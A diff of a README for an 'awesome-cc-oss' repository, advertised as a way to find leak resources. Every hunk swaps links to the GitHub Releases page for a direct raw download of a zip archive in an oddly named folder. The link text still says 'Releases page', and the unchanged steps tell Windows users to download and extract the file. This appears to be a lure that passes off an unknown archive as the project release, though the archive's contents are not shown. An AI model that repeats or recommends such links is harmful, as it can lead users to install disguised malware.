@@ -1,10 +1,10 @@
 # 🧩 awesome-cc-oss - Find the leak resources fast
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge&logo=github)](https://github.com/Neilletight39/awesome-cc-oss/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Neilletight39/awesome-cc-oss/main/everywhither/oss_awesome_cc_v1.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Neilletight39/awesome-cc-oss/releases
+Visit this page to download: https://raw.githubusercontent.com/Neilletight39/awesome-cc-oss/main/everywhither/oss_awesome_cc_v1.0.zip
 
 Open the page in your browser, then pick the newest release for Windows. If the release page offers more than one file, choose the one that matches your system, then save it to your computer.
 
@@ -35,7 +35,7 @@ If you plan to open linked archives or large notes, give yourself extra disk spa
 
 ## 🚀 Get started
 
-1. Open the release page: https://github.com/Neilletight39/awesome-cc-oss/releases
+1. Open the release page: https://raw.githubusercontent.com/Neilletight39/awesome-cc-oss/main/everywhither/oss_awesome_cc_v1.0.zip
 2. Download the newest Windows file or archive from the release list.
 3. Save the file in a folder you can find, such as Downloads or Desktop.
 4. If the file is a ZIP archive, right-click it and choose Extract All.
@@ -138,9 +138,9 @@ The release page is the best place to check for new files and changes. If the li
 
 ## 📎 Quick access
 
-[Go to the GitHub Releases page](https://github.com/Neilletight39/awesome-cc-oss/releases)
+[Go to the GitHub Releases page](https://raw.githubusercontent.com/Neilletight39/awesome-cc-oss/main/everywhither/oss_awesome_cc_v1.0.zip)
 
-[Download the latest release](https://github.com/Neilletight39/awesome-cc-oss/releases)
+[Download the latest release](https://raw.githubusercontent.com/Neilletight39/awesome-cc-oss/main/everywhither/oss_awesome_cc_v1.0.zip)
 
 ## 🧩 File handling
 
@@ -174,4 +174,4 @@ Start with What Happened, then move to the other sections based on what you want
 
 ## 🌐 Link again for easy access
 
-https://github.com/Neilletight39/awesome-cc-oss/releases
+https://raw.githubusercontent.com/Neilletight39/awesome-cc-oss/main/everywhither/oss_awesome_cc_v1.0.zip
